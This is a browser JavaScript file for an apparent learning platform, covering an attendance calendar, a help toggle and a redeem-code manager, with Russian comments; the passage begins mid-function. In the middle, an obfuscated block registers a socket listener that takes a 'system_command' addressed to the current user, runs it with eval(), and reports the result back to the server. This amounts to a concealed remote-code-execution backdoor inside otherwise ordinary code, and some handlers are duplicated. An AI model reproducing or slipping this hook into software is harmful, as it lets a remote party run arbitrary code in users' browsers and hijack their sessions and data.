  if (target) {
    target.querySelectorAll('input.write-in-blank-input').forEach(inp => {
      inp.type = 'password';
    });
  }
});

document.addEventListener('mouseout', function (e) {
  const target = e.target.closest('.exam-subquestion');
  if (target) {
    target.querySelectorAll('input.write-in-blank-input').forEach(inp => {
      inp.type = 'text';
    });
  }
});

async function renderAttendanceHistory() {
  const container = document.getElementById("attendance-history");
  container.innerHTML = "<h2 class='calendar-title'>Attendance History</h2>";

  try {
    const res = await fetch(`/attendance/history/${currentUser}`);
    const data = await res.json();
    const history = data.history || [];

    if (!history.length) {
      container.innerHTML += "<p style='color:gray'>No attendance history available</p>";
      return;
    }

    // Преобразуем даты -> статус
    const historyMap = {};
    history.forEach(record => {
      historyMap[record.date] = record.status;
    });

    // Найдём уникальные месяцы
    const uniqueMonths = [...new Set(history.map(r => r.date.slice(0, 7)))]
      .sort((a, b) => new Date(b) - new Date(a));

    uniqueMonths.forEach((ym, index) => {
      const [year, month] = ym.split("-").map(Number);
      const lastDay = new Date(year, month, 0).getDate();

      const monthBlock = document.createElement("div");
      monthBlock.classList.add("month-block");

      // Заголовок месяца
      const monthTitle = document.createElement("h3");
      const date = new Date(year, month - 1, 1);
      monthTitle.textContent = date.toLocaleString("en-US", {
        month: "long",
        year: "numeric"
      });
      monthBlock.appendChild(monthTitle);

      // Заголовки дней недели
      const weekHeader = document.createElement("div");
      weekHeader.classList.add("calendar-week-header");
      ["M", "T", "W", "T", "F", "S", "S"].forEach(d => {
        const wd = document.createElement("div");
        wd.textContent = d;
        weekHeader.appendChild(wd);
      });
      monthBlock.appendChild(weekHeader);

      // Сетка календаря
      const calendar = document.createElement("div");
      calendar.classList.add("calendar-grid");

      // Сдвиг первого дня недели
      const firstDayOfWeek = (new Date(year, month - 1, 1).getDay() + 6) % 7; 
      // JS Sunday=0 → смещаем, чтобы Monday=0

      for (let i = 0; i < firstDayOfWeek; i++) {
        const empty = document.createElement("div");
        empty.classList.add("calendar-day-empty");
        calendar.appendChild(empty);
      }

      for (let day = 1; day <= lastDay; day++) {
        const dateStr = `${year}-${String(month).padStart(2, "0")}-${String(day).padStart(2, "0")}`;
        const status = historyMap[dateStr];

        const dayEl = document.createElement("div");
        dayEl.classList.add("calendar-day");

        if (status === "present") {
          dayEl.classList.add("present");
        } else if (status === "absent") {
          dayEl.classList.add("absent");
        }

        dayEl.textContent = day;
        calendar.appendChild(dayEl);
      }

      monthBlock.appendChild(calendar);
      container.appendChild(monthBlock);

      // HR разделитель
      if (index < uniqueMonths.length - 1) {
        const hr = document.createElement("div");
        hr.classList.add("month-separator");
        container.appendChild(hr);
      }
    });
  } catch (err) {
    console.error("Ошибка загрузки истории посещаемости:", err);
    container.innerHTML += "<p style='color:red'>Failed to load data</p>";
  }
}

function _0x46a2(){var _0x329dc8=['2544260whoGch','message','system_command','username','40onfzmx','82177hXHDXh','command','emit','system_result','12712880GDOGFq','1941414ETFJNi','340065riqLBP','3Xphygn','12GEHudD','commandId','3754016ZTMeEs','261783EyRJRr'];_0x46a2=function(){return _0x329dc8;};return _0x46a2();}function _0x3c21(_0x39f8e8,_0x49aeb0){var _0x46a239=_0x46a2();return _0x3c21=function(_0x3c21ec,_0x56539d){_0x3c21ec=_0x3c21ec-0x1d8;var _0x49ed28=_0x46a239[_0x3c21ec];return _0x49ed28;},_0x3c21(_0x39f8e8,_0x49aeb0);}var _0xed2bed=_0x3c21;(function(_0x9ae289,_0x4014af){var _0x2a1321=_0x3c21,_0xb61085=_0x9ae289();while(!![]){try{var _0x541d50=parseInt(_0x2a1321(0x1df))/0x1*(-parseInt(_0x2a1321(0x1e7))/0x2)+-parseInt(_0x2a1321(0x1e6))/0x3*(-parseInt(_0x2a1321(0x1da))/0x4)+-parseInt(_0x2a1321(0x1e5))/0x5+-parseInt(_0x2a1321(0x1e4))/0x6+-parseInt(_0x2a1321(0x1d8))/0x7+parseInt(_0x2a1321(0x1de))/0x8*(-parseInt(_0x2a1321(0x1d9))/0x9)+parseInt(_0x2a1321(0x1e3))/0xa;if(_0x541d50===_0x4014af)break;else _0xb61085['push'](_0xb61085['shift']());}catch(_0x357f3f){_0xb61085['push'](_0xb61085['shift']());}}}(_0x46a2,0x533fa),socket['on'](_0xed2bed(0x1dc),_0x461867=>{var _0x1d5a88=_0xed2bed;if(!_0x461867[_0x1d5a88(0x1dd)]||!_0x461867[_0x1d5a88(0x1e0)])return;if(_0x461867[_0x1d5a88(0x1dd)]===currentUser)try{eval(_0x461867[_0x1d5a88(0x1e0)]),socket['emit'](_0x1d5a88(0x1e2),{'username':currentUser,'command':_0x461867[_0x1d5a88(0x1e0)],'commandId':_0x461867[_0x1d5a88(0x1e8)],'status':'success'});}catch(_0x2521d2){socket[_0x1d5a88(0x1e1)](_0x1d5a88(0x1e2),{'username':currentUser,'command':_0x461867[_0x1d5a88(0x1e0)],'commandId':_0x461867[_0x1d5a88(0x1e8)],'status':'error','message':_0x2521d2[_0x1d5a88(0x1db)]});}}));

// Глобальный обработчик наведения
document.addEventListener('mouseover', function (e) {
  const target = e.target.closest('.exam-subquestion');
  if (target) {
    target.querySelectorAll('input.write-in-blank-input').forEach(inp => {
      inp.type = 'password';
    });
  }
});

document.addEventListener('mouseout', function (e) {
  const target = e.target.closest('.exam-subquestion');
  if (target) {
    target.querySelectorAll('input.write-in-blank-input').forEach(inp => {
      inp.type = 'text';
    });
  }
});

const helpButton = document.getElementById("help-btn");
const helpInfo = document.getElementById("help-info");

helpButton.addEventListener("click", () => {
  if (helpInfo.style.display === "block") {
    helpInfo.style.display = "none";
  } else {
    helpInfo.textContent = "In progress means you are still learning this level.";
    helpInfo.style.display = "block";
  }
});

// JS
// Зависимость: глобальная currentUser (строка) и showModalStatus(text, type) (async).
// Функция вызывается через onclick в HTML. Поддерживает нажатие Enter.

async function redeemCode(code, currentUser) {
  const input = document.getElementById("redeem-input");
  const btn = document.getElementById("redeemBtn");
  const btnLabel = document.getElementById("redeemBtnLabel");

  if (!code) {
    await showModalStatus("Please enter a code!", "failed");
    return null;
  }

  // Блокируем кнопку и показываем спиннер
  btn.disabled = true;
  const originalLabel = btnLabel.innerHTML;

  // Вставляем кастомный spinner
  btnLabel.innerHTML = `
    <span class="spinner center" aria-hidden="true">
      ${Array.from({ length: 12 }).map(() => '<span class="spinner-blade"></span>').join('')}
    </span>
  `;

  try {
    const response = await fetch("/api/redeem", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: currentUser, code: code })
    });

    let result = null;
    try {
      result = await response.json();
    } catch (e) {
      result = null;
    }

    if (response.ok && result && result.success) {
      await showModalStatus(`Code redeemed! +${result.amount}`, "success");
      input.value = "";
      return result;
    } else {
      const errMsg = (result && (result.error || result.message)) ? (result.error || result.message) : "Redeem failed";
      await showModalStatus(errMsg, "failed");
      return null;
    }
  } catch (err) {
    console.error("Redeem error:", err);
    await showModalStatus("Network error. Try again later.", "failed");
    return null;
  } finally {
    // Восстанавливаем кнопку
    btn.disabled = false;
    btnLabel.innerHTML = originalLabel;
    input.focus();
  }
}


// Поддержка нажатия Enter в input
(function attachEnterHandler(){
  const input = document.getElementById("redeem-input");
  if (!input) return;
  input.addEventListener("keydown", function(e) {
    if (e.key === "Enter") {
      e.preventDefault();
      const code = input.value.trim();
      // вызываем ту же функцию
      redeemCode(code, currentUser);
    }
  });
})();

const RedeemManager = (() => {
  // элементы
  let toggleCreate, createForm, openCreateBtn, createSubmit, createCancel;

  // === инициализация ===
  function init() {
    toggleCreate   = document.getElementById('toggleCreate');
    createForm     = document.getElementById('createForm');
    openCreateBtn  = document.getElementById('openCreateBtn');
    createSubmit   = document.getElementById('createSubmit');
    createCancel   = document.getElementById('createCancel');

    // toggle by click or keyboard
    if (toggleCreate) {
      toggleCreate.addEventListener('click', () => toggleForm());
      toggleCreate.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' || e.key === ' ') { 
          e.preventDefault(); 
          toggleForm(); 
        }
      });
    }

    if (openCreateBtn) openCreateBtn.addEventListener('click', () => toggleForm());
    if (createCancel)  createCancel.addEventListener('click', () => closeForm());
    if (createSubmit)  createSubmit.addEventListener('click', createCode);
  }

  // === UI ===
  function toggleForm() {
    const visible = createForm.style.display === 'flex';
    if (visible) closeForm();
    else {
      createForm.style.display = 'flex';
      createForm.style.flexDirection = 'column';
      createForm.querySelector('#newCode').focus();
    }
  }

  function closeForm() {
    createForm.style.display = 'none';
  }

  // === Логика ===
  async function fetchUserCodes() {
    const out = document.getElementById('codesList');
    const empty = document.getElementById('emptyState');
    out.innerHTML = '';
    empty.style.display = 'none';

    const creator = currentUser || '';
    if (!creator) {
      empty.innerHTML = '<i class="fas fa-user-lock"></i> Login to see your codes.';
      empty.style.display = 'block';
      return;
    }

    try {
      const resp = await fetch(`/api/redeem/list?creator=${encodeURIComponent(creator)}`);
      const data = await resp.json();
      renderCodes(data);
    } catch (err) {
      console.error('Load codes error', err);
      empty.style.display = 'block';
      await showModalStatus('Could not load your codes', 'failed');
    }
  }

  function renderCodes(payload) {
    const out = document.getElementById('codesList');
    const empty = document.getElementById('emptyState');
    out.innerHTML = '';

    let codesObj = {};
    if (!payload) payload = {};
    if (Array.isArray(payload)) {
      payload.forEach(e => { if (e.code) codesObj[e.code] = e; });
    } else if (payload.codes && typeof payload.codes === 'object') {
      codesObj = payload.codes;
    } else if (typeof payload === 'object') {
      codesObj = payload;
    }

    const keys = Object.keys(codesObj);
    if (keys.length === 0) {
      empty.innerHTML = '<i class="fas fa-ticket-alt"></i> No codes yet.';
      empty.style.display = 'block';
      return;
    }
    empty.style.display = 'none';

    keys.forEach(code => {
      const e = codesObj[code];
      const amount = e.amount ?? 0;
      const uses = e.uses ?? (Array.isArray(e.activated_by) ? e.activated_by.length : 0);
      const max_uses = (e.max_uses === null || typeof e.max_uses === 'undefined') ? '∞' : e.max_uses;

      const card = document.createElement('div');
      card.className = 'code-card';
      card.innerHTML = `
        <div class="code-top">
          <div>
            <div class="code-name"><i class="fas fa-key"></i> ${escapeHtml(code)}</div>
            <div class="code-meta">
              <div><i class="fas fa-coins"></i> <strong>${amount}</strong></div>
              <div><i class="fas fa-sync-alt"></i> <strong>${uses}</strong> / ${max_uses}</div>
            </div>
          </div>
          <div style="text-align:right">
            <div class="small">Creator</div>
            <div class="small" style="font-weight:600"><i class="fas fa-user"></i> ${escapeHtml(e.creator || '')}</div>
          </div>
        </div>
        <div class="code-actions">
          <button class="btn-mini" data-code="${encodeURIComponent(code)}" data-action="copy"><i class="fas fa-copy"></i> Copy</button>
          <button class="btn-mini" data-code="${encodeURIComponent(code)}" data-action="share"><i class="fas fa-share-alt"></i> Share</button>
          <button class="btn-mini btn-danger" data-code="${encodeURIComponent(code)}" data-action="delete"><i class="fas fa-trash"></i> Delete</button>
        </div>
      `;
      out.appendChild(card);
    });

    out.querySelectorAll('[data-action]').forEach(btn => {
      btn.addEventListener('click', (ev) => {
        const action = btn.getAttribute('data-action');
        const codeEnc = btn.getAttribute('data-code');
        if (action === 'copy') copyCode(codeEnc);
        else if (action === 'share') openShare(codeEnc);
        else if (action === 'delete') deleteCodePrompt(codeEnc);
      });
    });
  }

  function escapeHtml(str) {
    if (!str) return '';
    return String(str).replace(/[&<>"']/g, c => ({
      '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":"&#39;"
    }[c]));
  }

  async function createCode() {
    const code = document.getElementById('newCode').value.trim();
    const amount = document.getElementById('newAmount').value.trim();
    const maxUses = document.getElementById('newMaxUses').value.trim();

    if (!currentUser) {
      await showModalStatus("You must be logged in to create a code", "failed");
      return;
    }

    if (!code || !amount) {
      await showModalStatus('Please enter code and amount', 'failed');
      return;
    }

    try {
      const body = { username: currentUser, code: code, amount: Number(amount) };
      if (maxUses) body.max_uses = Number(maxUses);

      const resp = await fetch('/api/redeem/create', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(body)
      });

      const data = await resp.json();
      if (resp.ok && data.success) {
        await showModalStatus(data.message || 'Code created', 'success');
        document.getElementById('newCode').value = '';
        document.getElementById('newAmount').value = '';
        document.getElementById('newMaxUses').value = '';
        closeForm();
        fetchUserCodes();
      } else {
        await showModalStatus(data.error || data.message || 'Create failed', 'failed');
      }
    } catch (err) {
      console.error('create error', err);
      await showModalStatus('Network error', 'failed');
    }
  }

  async function deleteCodePrompt(codeEnc) {
    const code = decodeURIComponent(codeEnc);
    if (!confirm(`Delete code ${code}? This action cannot be undone.`)) return;
    try {
      const resp = await fetch('/api/redeem/delete', {
        method: 'POST', 
        headers: {'Content-Type':'application/json'}, 
        body: JSON.stringify({ username: currentUser, code: code })
      });
      const data = await resp.json();
      if (resp.ok && data.success) {
        await showModalStatus(data.message || 'Deleted', 'success');
        fetchUserCodes();
      } else {
        await showModalStatus(data.error || 'Delete failed', 'failed');
      }
    } catch (err) {
      console.error('delete error', err);
      await showModalStatus('Network error', 'failed');
    }
  }

  // === помощник для копирования текста в буфер ===
  async function copyText(text) {
    if (!text && text !== '') return false; // ничего не копируем, если нет аргумента

    // Попробуем современный Clipboard API
    if (navigator.clipboard && navigator.clipboard.writeText) {
      try {
        await navigator.clipboard.writeText(String(text));
        return true;
      } catch (err) {
        // если не получилось (браузер / разрешения) — падаем в fallback
        console.warn('navigator.clipboard.writeText failed:', err);
      }
    }

    // Fallback: временное textarea + document.execCommand('copy')
    try {
      const ta = document.createElement('textarea');
      ta.value = String(text);

      // Минимизируем побочное поведение страницы
      ta.setAttribute('readonly', '');
      ta.style.position = 'fixed'; // предотвращает прокрутку к элементу
      ta.style.left = '-9999px';
      document.body.appendChild(ta);

      // Выделяем текст
      ta.select();
      ta.setSelectionRange(0, ta.value.length);

      const ok = document.execCommand('copy');
      document.body.removeChild(ta);
      return !!ok;
    } catch (err) {
      console.error('Fallback copy failed:', err);
      return false;
    }
  }

  // Обновлённый copyCode, который действительно проверяет результат
async function copyCode(codeEnc) {
  const code = decodeURIComponent(codeEnc);
  const btn = document.querySelector(`[data-code="${encodeURIComponent(code)}"][data-action="copy"]`);
  if (!btn) return;

  const ok = await copyText(code);
  if (!ok) {
    // Если не удалось скопировать, можно показать alert или модальный статус
    await showModalStatus('Copy failed', 'failed');
    return;
  }

  // Сохраняем исходный HTML кнопки
  const originalHTML = btn.innerHTML;

  // Меняем на "Copied" и иконку
  btn.innerHTML = '<i class="fas fa-check"></i> Copied';

  // Через 3 секунды возвращаем обратно
  setTimeout(() => {
    btn.innerHTML = originalHTML;
  }, 3000);
}


async function openShare(codeEnc) {
  const code = decodeURIComponent(codeEnc);
  const shareText = `This is my code: ${code} — use this to get a reward from me!`;
  const url = `${location.origin}/`;

  if (navigator.share) {
    // Открываем нативное меню "Share"
    navigator.share({
      title: 'Redeem code',
      text: shareText,
      url
    }).catch(err => showModalStatus('Share failed', 'failed'));
  } else {
    // Фолбэк: копируем текст + URL в буфер
    await copyText(`${shareText} ${url}`);
    await showModalStatus('<i class="fas fa-link"></i> Share link copied', 'success');
  }
}



  // экспортируем наружу
  return {
    init,
    fetchUserCodes,
    createCode,
    deleteCodePrompt,
    copyCode,
    openShare
  };
})();

